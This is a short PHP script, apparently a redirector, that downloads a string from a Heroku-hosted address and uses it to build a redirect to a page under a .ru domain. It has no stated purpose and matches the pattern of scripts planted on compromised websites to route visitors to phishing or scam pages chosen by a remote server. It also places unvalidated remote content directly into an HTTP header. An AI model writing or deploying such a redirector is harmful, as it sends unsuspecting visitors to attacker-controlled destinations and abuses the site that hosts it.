<?php

$output = file_get_contents('https://ficom.herokuapp.com/');
header('Location: https://ggsite.ru/ficom/index.php'.$output);
	
?>